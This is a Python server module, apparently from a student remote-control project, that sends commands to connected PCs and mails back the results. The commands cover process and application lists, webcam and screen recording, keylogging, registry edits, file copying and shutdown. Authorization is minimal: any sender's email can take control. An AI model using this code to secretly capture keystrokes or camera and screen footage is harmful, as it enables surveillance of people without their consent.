import os
import re
from collections import defaultdict
from queue import Queue
from random import choices
from time import sleep

import cv2

from socket_email.server_control.old_handle import app_process_server
from socket_email.server_control.old_handle import mac_address_server
from socket_email.server_control.old_handle import shutdown_logout_server
from socket_email.server_control.mail_provider_handle import SMTP_service as sp

BUFSIZ = 4 * 1024

conn_ip_list = [] # list_ip() # Tuple (conn, addr)

auth_dict = defaultdict(lambda: False) # MAIL -> bool
email_ip_dict = {} # MAIL -> IP
ip_email_dict = {} # IP -> MAIL (inverse function)

action_dictionary = {}

def is_valid_ip(ip):
    ip_address = "([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])"
    port = "([0-9]|[1-9][0-9]|[1-9][0-9]{2}|[1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])"
    ip_pattern = re.compile(r"^" + ip_address + "\\." + ip_address + "\\." + ip_address + "\\." + ip_address + "\\:" + port + "$")

    return bool(ip_pattern.match(ip))

def authorize(email, ip):
    if ((email not in auth_dict) or (not auth_dict[email])) and ip in [elem[1] for elem in conn_ip_list]:
        auth_dict[email] = True
        email_ip_dict[email] = ip
        ip_email_dict[ip] = email
        sp.send_threading(email, "AUTH", "OK")
    else:
        sp.send_threading(email, "AUTH", "ALREADY AUTHORIZED / CONTROLLED")

def list_ip(email):
    ips = '\n'.join([elem[1][0] + ':' + str(elem[1][1]) for elem in conn_ip_list])
    sp.send_threading(email, "LIST", ips)

def disconnect(email):
    if email in auth_dict and auth_dict[email]:
        auth_dict[email] = False
        ip_email_dict[email_ip_dict[email]] = None
        email_ip_dict[email] = None

        sp.send_threading(email, "DISC", "OK")
    sp.send_threading(email, "DISC", "NOT AUTH YET")

def find_corresponding_email(ip_address):
    for i in email_ip_dict:
        if email_ip_dict[i] == ip_address:
            return i

def delete_ip_from_list(ip_address):
    to_delete = None
    for i in range(len(conn_ip_list)):
        if conn_ip_list[i][1] == ip_address:
            to_delete = conn_ip_list[i]
            break
    if to_delete is not None:
        conn_ip_list.remove(to_delete)

def remove_this_connection(conn, ip_address):
    conn.close()
    delete_ip_from_list(ip_address)
    email = find_corresponding_email(ip_address)
    disconnect(email)

def __init__():
    for i in conn_ip_list:
        action_dictionary[i[1]] = Queue(maxsize=0)

def list_process(ip_address):
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8")), # NHO DIEN THEM CAI NAY (TRONG FILE CLIENT.PY)

        result = app_process_server._list(conn, "PROCESS")
        sp.send_threading(ip_email_dict[ip_address], "LIST PROCESS", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)


def list_application(ip_address):
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8"))

        result = app_process_server._list(conn, "APPLICATION")
        sp.send_threading(ip_email_dict[ip_address], "LIST APP", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)

def kill_process(ip_address, id):
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8"))

        result = app_process_server.send_kill(conn, id)
        sp.send_threading(ip_email_dict[ip_address], "KILL PROCESS", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)

def kill_application(ip_address, id):
    def action_message(conn):
        conn.sendall(bytes("APP_PRO", "utf8"))

        result = app_process_server.send_kill(conn, id)
        sp.send_threading(ip_email_dict[ip_address], "KILL APP", str(result))
        # print(result)

    action_dictionary[ip_address].put(action_message)

def capture_webcam(ip_address, time=5):
    def action_message(conn):
        conn.sendall(b"WEBCAM".ljust(BUFSIZ))
        conn.sendall(str(time).encode().ljust(BUFSIZ))

        # Recv phase
        try:
            size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
            data_to_recv = b''
            for idx in range(0, size_to_recv, BUFSIZ):
                r = conn.recv(BUFSIZ)
                data_to_recv += r
            data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
            sp.send_threading(ip_email_dict[ip_address], "WEBCAM", data_to_recv, "file.avi")
        except Exception:
            sp.send_threading(ip_email_dict[ip_address], "WEBCAM", "FAIL")
    action_dictionary[ip_address].put(action_message)

def create_video(image_folder: str):
    character_list = 'abcdefghijklm_'
    video_name = ''.join(choices(character_list, k = 5)) + 'video.avi' # Random video name!

    images = [img for img in os.listdir(image_folder) if img.endswith(".png")]
    frame = cv2.imread(os.path.join(image_folder, images[0]))
    height, width, layers = frame.shape

    video = cv2.VideoWriter(video_name, 0, 1, (width,height))

    for image in images:
        video.write(cv2.imread(os.path.join(image_folder, image)))

    cv2.destroyAllWindows()
    video.release()
    return video_name

def capture_screen(ip_address, time=0.5): # Not done ! need more fix for multi threading
    def action_message(conn):
        conn.sendall(b'LIVESCREEN'.ljust(BUFSIZ))
        str_time = str(time).encode().ljust(BUFSIZ)
        conn.sendall(str_time)

        # number_of_images = 10
        n = 1
        character_list = 'abcdefghijklm_'

        screenshots_directory = './' + ''.join(choices(character_list, k = 5)) + 'screenshots'

        if (not os.path.exists(screenshots_directory)):
            os.makedirs(screenshots_directory)

        while True:
            print("n = ", n)
            msg = conn.recv(BUFSIZ).decode('utf8')
            print('Message:', msg)
            if 'END' in msg:
                break
            msg = msg.strip()
            print('Message:', msg, '1')
            print(len(msg))
            if (len(msg) == 0):
                break
            print(msg)

            size_to_recv = int(msg)
            print("size_to_recv = ", size_to_recv)

            data_to_recv = b''
            for idx in range(0, size_to_recv, BUFSIZ):
                r = conn.recv(BUFSIZ)
                data_to_recv += r
            data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
            file_name = screenshots_directory + "/{}.png".format(n)
            print("file_name = ", file_name)
            open(file_name, "wb").write(data_to_recv)
            n += 1

        video_name = create_video(screenshots_directory)

        files_list = os.listdir(screenshots_directory)
        for file in files_list:
            os.remove(os.path.join(screenshots_directory, file))

        file_open = open(video_name, 'rb')
        file_data = file_open.read()
        sp.send_threading(ip_email_dict[ip_address], "LIVESCREEN", file_data, 'file.avi')
        file_open.close()

    action_dictionary[ip_address].put(action_message)


def shut_down(ip_address):
    def action_message(conn):
        shutdown_logout_server.shutdown(conn)

        remove_this_connection(conn, ip_address)

        result = 'OK'
        sp.send_threading(ip_email_dict[ip_address], "SHUTDOWN", result)

    action_dictionary[ip_address].put(action_message)

def logout(ip_address):
    def action_message(conn):
        shutdown_logout_server.logout(conn)

        remove_this_connection(conn, ip_address)

        result = 'OK'
        sp.send_threading(ip_email_dict[ip_address], "LOGOUT", result)

    action_dictionary[ip_address].put(action_message)

def restart(ip_address):
    def action_message(conn):
        shutdown_logout_server.restart(conn)

        remove_this_connection(conn, ip_address)

        result = 'OK'
        sp.send_threading(ip_email_dict[ip_address], "RESTART", result)

    action_dictionary[ip_address].put(action_message)

def mac_address(ip_address):
    def action_message(conn):
        conn.sendall(bytes("MAC", "utf8"))

        result = mac_address_server.mac_address(conn)
        sp.send_threading(ip_email_dict[ip_address], "MAC", result)
        # print(result)

    action_dictionary[ip_address].put(action_message)

def keylog(ip_address, time=10):
    def action_message(conn):
        conn.sendall(bytes("KEYLOG", "utf8"))
        conn.sendall(b'HOOK'.ljust(BUFSIZ))
        sleep(time)
        conn.sendall(b'HOOK'.ljust(BUFSIZ))
        conn.sendall(b'PRINT'.ljust(BUFSIZ))

        data = conn.recv(BUFSIZ)
        sp.send_threading(ip_email_dict[ip_address], "KEYLOG", data.decode('utf8'))

    action_dictionary[ip_address].put(action_message)

def registry_list(ip_address, full_path):
    def action_message(conn):
        conn.sendall(bytes("REGISTRY", "utf8"))
        conn.sendall(bytes("LIST ", "utf8"))
        conn.sendall(bytes(full_path, "utf8"))
        # receive all data from the client
        size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
        data_to_recv = b''
        for _ in range(0, size_to_recv, BUFSIZ):
            r = conn.recv(BUFSIZ)
            data_to_recv += r
        data_to_recv = data_to_recv[:size_to_recv]
        sp.send_threading(ip_email_dict[ip_address], "REGISTRY LIST", data_to_recv.decode('utf8'))
        # print(data_to_recv)

    action_dictionary[ip_address].put(action_message)


def registry_update(ip_address, absolute_path, value, data_type):
    def action_message(conn):
        conn.sendall(bytes("REGISTRY", "utf8"))
        conn.sendall(bytes("UPDATE ", "utf8"))
        conn.sendall(bytes(absolute_path, "utf8"))
        conn.sendall(bytes(" ", "utf8"))
        conn.sendall(bytes(value, "utf8"))
        conn.sendall(bytes(" ", "utf8"))
        conn.sendall(bytes(data_type, "utf8"))

        ack = conn.recv(BUFSIZ).decode('utf8')
        sp.send_threading(ip_email_dict[ip_address], "REGISTRY UPDATE", ack)
        # print(ack)

    action_dictionary[ip_address].put(action_message)

def dir_list(ip_address, path_to_folder):
    def action_message(conn):
        conn.sendall(bytes("DIRECTORY", "utf8"))
        conn.sendall(bytes("LIST ", "utf8"))
        conn.sendall(bytes(path_to_folder, "utf8"))
        size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
        data_to_recv = b''
        for _ in range(0, size_to_recv, BUFSIZ):
            r = conn.recv(BUFSIZ)
            data_to_recv += r

        data_to_recv = data_to_recv[:size_to_recv]
        # print(data_to_recv.decode('utf8'))
        sp.send_threading(ip_email_dict[ip_address], "DIR LIST", data_to_recv.decode('utf8'))

    action_dictionary[ip_address].put(action_message)

def dir_copy(ip_address, src_path, dst_path):
    def action_message(conn):
        conn.sendall(bytes("DIRECTORY", "utf8"))
        conn.sendall(bytes("COPY ", "utf8"))
        conn.sendall(bytes(src_path, "utf8"))
        conn.sendall(bytes(" ", "utf8"))
        conn.sendall(bytes(dst_path, "utf8"))

        ack = conn.recv(BUFSIZ).decode('utf8')
        sp.send_threading(ip_email_dict[ip_address], "DIR COPY", ack)
        # print(ack)
    action_dictionary[ip_address].put(action_message)

def raise_error_message(error_message):
    print(error_message)

